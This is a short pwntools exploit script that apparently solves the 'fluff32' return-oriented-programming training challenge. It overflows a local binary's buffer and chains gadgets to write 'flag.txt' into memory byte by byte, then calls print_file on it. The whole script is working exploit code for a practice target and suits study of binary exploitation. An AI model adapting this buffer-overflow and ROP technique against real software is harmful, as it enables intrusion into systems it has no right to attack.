#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./fluff32")

offset = 44
junk = b"A" * offset

flag = "flag.txt"

print_file = p32(0x80483d0)
data = 0x804a018

xchg_ecx_dl = p32(0x8048555)
popal_cld = p32(0x8048527)

payload  = b""
payload += junk

for i in range(len(flag)):
    payload += popal_cld
    payload += p32(0) * 5
    payload += p32(ord(flag[i]))
    payload += p32(data + i)
    payload += p32(0)
    payload += xchg_ecx_dl

payload += print_file
payload += b"B" * 4
payload += p32(data)

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
